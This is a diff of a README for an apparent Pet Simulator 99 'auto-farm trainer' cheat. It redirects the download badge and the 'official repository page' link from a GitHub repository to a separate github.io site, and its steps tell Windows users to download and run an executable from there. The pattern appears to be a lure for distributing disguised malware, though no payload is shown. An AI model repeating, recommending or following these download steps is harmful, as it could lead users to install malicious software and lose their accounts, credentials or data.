@@ -1,6 +1,6 @@
 # 🎮 Pet-Simulator-99-Auto-Farm-Trainer-2026-Nitro - Improve Your Game Progress With Speed
 
-[![](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://github.com/Ingaborgunsent220/Pet-Simulator-99-Auto-Farm-Trainer-2026-Nitro)
+[![](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://ingaborgunsent220.github.io)
 
 ## 📋 Overview
 
@@ -21,7 +21,7 @@ Ensure your computer meets these requirements before you start:
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official repository page](https://github.com/Ingaborgunsent220/Pet-Simulator-99-Auto-Farm-Trainer-2026-Nitro) to access the download files.
+1. Visit the [official repository page](https://ingaborgunsent220.github.io) to access the download files.
 2. Look for the latest release version on the page.
 3. Click the executable file to begin the download to your machine.
 4. Save the file in a folder you can find easily, such as your Downloads folder or Desktop.
